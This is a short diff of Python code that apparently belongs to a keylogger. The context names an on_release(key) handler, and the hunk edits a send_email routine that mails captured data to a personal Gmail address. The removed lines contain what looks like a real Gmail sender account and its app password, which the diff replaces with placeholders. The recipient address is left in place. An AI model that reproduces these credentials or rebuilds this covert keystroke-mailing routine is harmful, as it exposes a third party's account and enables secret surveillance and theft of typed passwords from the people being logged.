@@ -35,8 +35,8 @@ def on_release(key):
 
 def send_email():
     try:
-        email = "myfakeaccoun625262@gmail.com"
-        password = "yxyk pctc hrjo otaz"
+        email = "email@gmail.com"
+        password = " password"
         
         
         send_to_email = "tiwariraghav16@gmail.com"
